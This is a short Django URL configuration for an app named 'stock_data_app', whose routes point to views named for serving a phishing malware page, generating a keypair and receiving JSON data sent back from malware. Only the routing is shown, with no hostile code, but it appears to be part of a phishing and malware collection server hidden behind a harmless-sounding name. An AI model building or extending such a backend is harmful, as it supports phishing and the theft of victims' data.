# stock_data_app/urls.py
from django.urls import path
from . import views

app_name = 'stock_data_app'

urlpatterns = [
    path('', views.serve_malware_page_phishing, name='home'),
    path('key', views.generate_keypair, name='gen_keypair'),
    path('receive', views.receive_json_from_malware, name='receive-malware-data')
]
